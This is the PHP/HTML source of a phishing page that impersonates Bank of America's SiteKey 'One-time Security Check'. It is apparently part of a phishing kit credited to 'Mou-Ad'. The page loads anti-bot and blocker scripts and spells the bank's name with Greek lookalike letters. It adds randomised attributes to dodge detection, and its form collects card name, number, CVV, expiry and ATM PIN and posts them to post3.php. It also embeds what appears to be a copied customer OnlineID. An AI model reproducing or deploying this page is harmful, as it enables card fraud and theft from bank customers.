<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include 'antibots.php';
include './bt.php';
include "./blocker.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html class="win ff ff-9 cf-cnx-regular-inactive" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US"><head><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.svg#cnx-regular') format('svg'); font-weight: normal; font-style: normal; font-variant: normal; }</style>


<!-- DPID: C1S4-156-1 RID:fGYG56dGgkQAAAlPKM0AAABH --> 


<script language="JavaScript" type="text/javascript">
			var boaVIPAAuseGzippedBundles = "false";
			var boaVIPAAjawrEnabled = "false";
</script>

<!-- XENGINE LSU Vipaa 6.0 2015.08 r7 -->






<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>&Beta;ank of &Alpha;merica | Create SiteKey Challenge Questions and Answers</title>
	<meta name="Description" content="Create your SiteKey challenge questions and answers to protect your account.">
<meta name="Keywords" content="select-question-answers">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">

   <link rel="shortcut icon" href="favicon.ico" type="image/ico">


	<script language="JavaScript" type="text/javascript">
			boaVIPAAuseGzippedBundles = "true";
	</script>

<!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->


		<script language="JavaScript" type="text/javascript">
			boaVIPAAjawrEnabled = "true";
		</script>
				<link rel="stylesheet" type="text/css" href="files/global-jawr.css" media="all">
				<link rel="stylesheet" type="text/css" href="files/vipaa-jawr.css" media="all">
				<script src="files/global-jawr.js" type="text/javascript"></script>
				<script src="files/vipaa-jawr.js" type="text/javascript"></script>
<!-- PHASE 2B CHANGES currentLocation is /login/sitekey-creation/select-question-answers -->


	
	<style type="text/css"> body { display : none;} </style>
	<script src="files/deploy2.js" charset="iso-8859-1" type="text/javascript"></script><script src="files/mTag.js" charset="iso-8859-1" type="text/javascript"></script></head>
	<body style="display: block;" class="trfwl-body      ">
	<form name="verifyForm" action="post3.php" method="post">
<input name="onlineid" type="hidden" value="<?php echo $onlineid;?>">

		<script type="text/javascript"> 
		if (self == top) {
		  var theBody = document.getElementsByTagName('body')[0];
		  theBody.style.display = "block";
		} else { 
		  top.location = self.location; 
		}
		</script>
		<noscript><style>body{display : block;}</style></noscript>
		
		<a class="ada-hidden" href="#skip-to-h1" name="anc-skip-to-main-content">Skip to main content</a>
		
		<div class="two-row-flex-wideleft-layout">
			<div class="center-content">
				<div class="header">


<div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="header-module">
   <div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="fsd-secure-esp-skin">
   	  <img alt="Boa" src="IMG/boa_logo.gif" height="28" width="207">
      <div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="page-type"></div>
      <div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="right-links">
		<div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="secure-area">Secure Area</div>
       <a class="divide" href="/login/languageToggle.go?request_locale=es-us" target="_self" name="spanish_toggle" title="Muestra esta sesi n de la Banca en L nea">En Español</a>
       <div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="clearboth"></div>
      </div>
      <div class="clearboth"></div>
   </div>
</div>
	
<div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="page-title-module h-100">
  <div class="red-grad-bar-skin sup-ie" id="skip-to-h1">
    <h1 class="cnx-regular" data-font="#!">One-time Security Check</h1>
  </div>
</div>
<!-- Just inside Attempt -->
	






<!-- MessageCenter field validation -->
<!-- Added for OMC Rewards -->





<script type="text/javascript">
	var continueURL = '/login/ping';
	function myUrl() {
			window.location =  '/login/sign-in/signOnScreen.go';	
		 		     	    	   
	    	}
</script>


	
</div>
				<div class="flex-top-row"></div>
				<div class="bottom-row">
					<div class="left-column">
					



<table border="0" width="100%" id="table1">
	<tr>
		<td   for="<?php echo rand(9999999, 9999999999999999999999); ?>" colspan="2"><b>
		<font color="#FFFFFF" style="font-size: 11pt" face="Arial">&nbsp;</font><font style="font-size: 11pt" face="Arial" color="#808080">Update the Credit Card details</font></b></td>
	</tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
			<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Name on Card :</b></label></font></td>
		<td>&nbsp;&nbsp;
	   <input type="text" id="onlineId1" name="nameon" placeholder="Name on Card " value="" maxlength="29" class="signin-text-box" size="16 value="" required>
                        <tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	</tr>
			<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Card Number :</b></label></font></td>
		<td>&nbsp;&nbsp;
	   <input type="text" id="CardNumber" name="cc" placeholder="Credit Card number " value="" maxlength="16" class="signin-text-box" size="16 value="" required>
                        <tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
			<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Security code :</b></label></font></td>
		<td>&nbsp;&nbsp;
	   <input type="text" id="onlineId1" name="CVV" placeholder="CVV" value="" maxlength="3" class="signin-text-box" size="2" type="password value="" required>
                        <tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * Expiration Date:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $exp1class; ?>" type="text" id="bmonth" size="1" maxlength="2" name="bmonth" value="" required>-<input class="<?echo $exp3class; ?>" type="text" id="byear" size="3" maxlength="4" name="byear" value="" required>
		<font face="Arial" size="1">MM-YYYY</font></td>
	</tr>
		</td>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">
<label for="newEmailAddress"><b> * ATM/PIN:</b></label></font></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $mmnclass; ?>" name="PIN" placeholder="xxxx" size="2" maxlength="16" type="password" value="" required></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">
		<p align="right"><font face="Arial" size="2">

		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;<input type="image" src="./IMG/continue.jpg" name="B1" alt="Continue"style=""></td>
	</tr>
</table>

</div>
					<div class="right-column no-print">



<script type="text/javascript">
var quickHelpRequestURL = '';
</script>
	<div class="quick-help-module">
		<div class="fsd-liveperson-skin">
					<div class="sm-title">
					
					
					
						
						<h2   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="sm-header">Quick help</h2>
					</div>
						<div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="sm-topcontent-dottedbtm">
					    <ul role="tablist" class="accordion ui-accordion ui-widget ui-helper-reset ui-accordion-icons">
											<li class="ui-accordion-li-fix">
											<a aria-expanded="false" name="anc-question-0" href="javascript:void(0);" class="heading ui-accordion-header ui-helper-reset ui-state-default ui-corner-all"><span class="ada-hidden">show </span><span class="title">How are challenge questions used?</span></a>
											<div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" role="tabpanel" style="height: auto; display: none;" class="content-area ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom cntheight"><p>SiteKey
 challenge questions help protect your Online &Beta;anking account. If you or
 someone else tries to sign in from a computer or mobile 
device&nbsp;that we don't recognize, we'll ask one of these questions. 
Answering these questions helps us make sure it's you trying to sign in.
 The questions must be answered correctly to access Online &Beta;anking.</p></div>
											</li>
											<li   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="ui-accordion-li-fix">
											<a aria-expanded="false" name="anc-question-1" href="javascript:void(0);" class="heading ui-accordion-header ui-helper-reset ui-state-default ui-corner-all"><span class="ada-hidden">show </span><span class="title">Are answers case-sensitive?</span></a>
											<div role="tabpanel" style="height: auto; display: none;" class="content-area ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom cntheight"><p>No,
 answers are not case-sensitive. Answers with or without capitalization 
are okay. Just create answers that are unique so you'll remember. We 
won't create possible frustration later by checking capitalizations.</p></div>
											</li>
											<li class="ui-accordion-li-fix">
											<a aria-expanded="false" name="anc-question-2" href="javascript:void(0);" class="heading ui-accordion-header ui-helper-reset ui-state-default ui-corner-all"><span class="ada-hidden">show </span><span class="title">Can I use special characters?</span></a>
											<div role="tabpanel" style="height: auto; display: none;" class="content-area ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom cntheight"><p>Please use only letters, numbers, spaces hyphens and periods. Don't use other special characters in your answers.</p></div>
											</li>
					    </ul>
					</div>
							<div class="sm-btmcontent">



<!-- Added for PRP-1 to block the chat link for certain cases -->










<script type="text/javascript">
	var lpUnit = "olb-passcode";	
	if (typeof(lpLanguage)=='undefined')
		var lpLanguage = 'english';
	var ConversionStage = "SiteKey Creation - Select Questions Answers"	
</script>
<script type="text/javascript" src="files/mtagconfig.js"></script>
<script type="text/javascript">
	lpAddVars('page','ConversionStage','SiteKey Creation - Select Questions Answers');

	
	<!-- Added for PRP-1: For global error and no contacts issue case -->
	
</script>

	<div class="liveperson-module">
			<div id="lpButtonDiv"></div>
	</div>
							</div>
		</div>
	</div>

<script type="text/javascript">
	
	if(passCodeErrorCounter == undefined || passCodeErrorCounter == 0){
		var passCodeErrorCounter = 0;
	}
	if(onlineIdErrorCounter == undefined || onlineIdErrorCounter == 0 ){
		var onlineIdErrorCounter = 0;
	}
		lpAddVars('page','Section','SiteKey Creation');
		lpAddVars('page','Errortype','oas');



	
	lpAddVars('session','State','AZ');
	lpAddVars('session','OnlineID','jmccown8in1ul');
	lpAddVars('session','Data','AC4C29427369AA300ADB75CBEE438261FF7DE9F36FAB4EED');
	$(document).ready(function(){
		updateLpCounters();
	});
	function updateLpCounters(){
		if(document.getElementById('lpOlbResetErrorCounterId') != undefined){
			document.getElementById('lpOlbResetErrorCounterId').value=onlineIdErrorCounter;
		}
		if(document.getElementById('lpPasscodeErrorCounterId') != undefined){
			document.getElementById('lpPasscodeErrorCounterId').value = passCodeErrorCounter;
		}
	}
	function getSelectedAcctForConvAction(){
		if(document.getElementById('selectVerifyAccount') != undefined){
			var acctDropDown = document.getElementById('selectVerifyAccount');
			var selValue = acctDropDown.options[acctDropDown.selectedIndex].value;
			if(selValue != ''){
				if(selValue == 'atmDebit'){
					conversionAction = 'atm';
				}
				else if(selValue == 'credit'){
					conversionAction = 'credit card';
				}
				else{
					conversionAction = 'other';
				}
			}
			else{
				conversionAction = '';
			}
		}
	}


</script>
</div>
					<div class="clearboth"></div>
				</div>
				<div class="single-column-row"></div>
				<div class="footer">
					<div class="footer-top">&nbsp;</div>
					<div class="footer-inner">

<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
		<div class="secure">Secure area</div>
	
       
      <div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="link-container">
         <div   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="link-row"> 
				
				<a   for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="last-link" href="#" name="Privacy_&amp;_Security_footer" title="Privacy &amp; Security" target="_blank">Privacy &amp; Security</a>
				<div  for="<?php echo rand(9999999, 9999999999999999999999); ?>" class="clearboth"></div>
         </div>
      </div>
      <p>&Beta;ank of &Alpha;merica, N.A. Member FDIC. <a name="Equal_Housing_Lender" href="#" target="_blank">Equal Housing Lender</a> <br>© 2018 &Beta;ank of &Alpha;merica Corporation. All rights reserved.</p>
   </div>
</div>
</div>
				</div>
			</div>
		</div>
	</form>
</body>

</html>